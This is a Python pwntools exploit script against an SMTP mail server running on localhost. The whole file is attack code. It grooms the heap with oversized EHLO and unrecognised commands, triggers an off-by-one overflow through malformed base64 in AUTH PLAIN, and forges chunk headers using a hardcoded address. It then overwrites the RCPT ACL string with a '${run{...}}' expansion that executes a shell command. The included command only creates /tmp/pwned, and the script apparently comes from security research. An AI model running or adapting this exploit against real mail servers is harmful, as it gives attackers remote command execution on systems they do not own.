#!/usr/bin/python2
# -*- coding: utf-8 -*

import time

from pwn import *
from base64 import b64encode

p = None

def ehlo(v):
    p.sendline("EHLO " + v)
    print(p.recvuntil("HELP"))


def unrec(v):
    p.sendline(v)
    print(p.recvuntil("command"))


def bad_base64(v):
    return v.encode("base64").replace("\n", "").replace("=", "")


def auth_plain(v):
    p.sendline("AUTH PLAIN {}".format(v))
    print(p.recvuntil("data"))


def exploit():
    global p

    p = remote("localhost", 25)

    time.sleep(0.6)

    # 2000 = 0x7d0
    # 8000 = 0x1f40
    # 8200 = 0x2008
   
    #raw_input("step1-1: ehlo 0x1f40")
    ehlo("A" * 0x1F40)
    #raw_input("step1-2: ehlo 0x10")
    ehlo("B" * 0x10)
    
    # 0x7d0=2000
    # 需要 0x7d0+0x7d0*3+1=8001的空间
    #raw_input("step2: uncommd 0x7d0")
    # 全部是不可打印字符，会生成
    unrec("\xff" * 0x7D0)

    #raw_input("step3: ehlo 0x2008")
    ehlo("C" * 0x2008)

    # 以上完成布局

    raw_input("step4: send bad data via to trigger off-by-one")
    tail = b64encode('\xf2\xf1\xf3')
    content = b64encode("D"*8199)  + tail[:-1] # -1的时候就会溢出，-2的时候不溢
    #content=bad_base64("D" * 0x2008)[:-1] + "PE"
    auth_plain(content)

    raw_input("step5: fake chunk head")
    # storeblock 头
    new_header_offset = (
        0xD0 - 0x10 - 0x10
    )  # extension size (0x20f0-0x2020) - chunk and storeblock headers size (0x10+0x10)
    # 原始是storeblock的长度都是0x2000+8
    b2_size = 0x2008  # size of second b64 decoded storeblock
    # fake chunk 头
    fake_chunk_header = p64(0)  # prev_size
    # 缩减后的block的长度 0x2020-(0x20f0-0x2020)=0x1f50
    fake_chunk_header += p64(0x1F51)  # size
    # 构造数据
    content= bad_base64(
            "E" * new_header_offset
            + fake_chunk_header
            + "F" * (b2_size - new_header_offset - len(fake_chunk_header))
        )
    auth_plain(content)

    raw_input("step6: echo 16")
    # 
    ehlo("G" * 16)



    unrec("\xff" * 0x7D0)
    unrec("\xff" * 0x7D0)
    fake_chunk_header = p64(0x4110)
    fake_chunk_header += p64(0x1F50)
    auth_plain(
        bad_base64(
            "H" * new_header_offset
            + fake_chunk_header
            + "I" * (b2_size - new_header_offset - len(fake_chunk_header))
        )
    )
    # address of the ACL strings storeblock (not the chunk)
    address_of_acl_storeblock = 0x55555582E480
    auth_plain(
        bad_base64(
            "J" * 0x2008  # filler
            + p64(0x2021)  # chunk size
            + p64(address_of_acl_storeblock)
            + p64(0x2008)  # storeblock length (size)
            + "K" * 0xB8  # filler
        )
    )
    # this releases the storeblocks (also our ACL storeblock) because of the reset
    ehlo("L" * 16)
    # the offset from ACL string storeblock address + 0x10 until the acl_smtp_rcpt string
    acl_smtp_rcpt_offset = 0x120
    cmd = '/bin/bash -c "touch /tmp/pwned"'
    cmd_expansion_string = "${run{" + cmd + "}}\0"
    # overwrite the acl_smtp_rcpt string with our custom command
    auth_plain(
        bad_base64(
            "M" * acl_smtp_rcpt_offset
            + cmd_expansion_string
            + "N" * (0x2008 - acl_smtp_rcpt_offset - len(cmd_expansion_string))
        )
    )
    p.sendline("MAIL FROM:<fun@pabe.seclab-bonn.de>")
    print(p.recvuntil("OK"))
    # this will trigger the ACL check!
    p.sendline("RCPT TO:<hack-the-heap@pabe.seclab-bonn.de>")   
    print(p.recvuntil("OK"))


if __name__ == "__main__":
    exploit()
